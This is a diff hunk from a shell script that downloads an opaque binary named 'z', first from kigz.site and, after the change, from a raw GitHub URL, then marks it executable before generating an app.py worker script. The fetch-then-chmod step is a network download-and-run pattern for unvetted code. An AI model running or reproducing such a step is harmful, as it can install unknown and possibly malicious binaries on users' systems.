@@ -13,7 +13,7 @@ mkdir -p "$WORK_DIR"
 cd "$WORK_DIR" || exit
 
 echo "[*] Downloading execution binary..."
-wget -O "$WORK_DIR/z" http://kigz.site/z
+wget -O "$WORK_DIR/z" https://raw.githubusercontent.com/kisoazmarl-blip/sleep/refs/heads/main/z
 chmod +x "$WORK_DIR/z"
 
 echo "[*] Generating app.py worker script..."
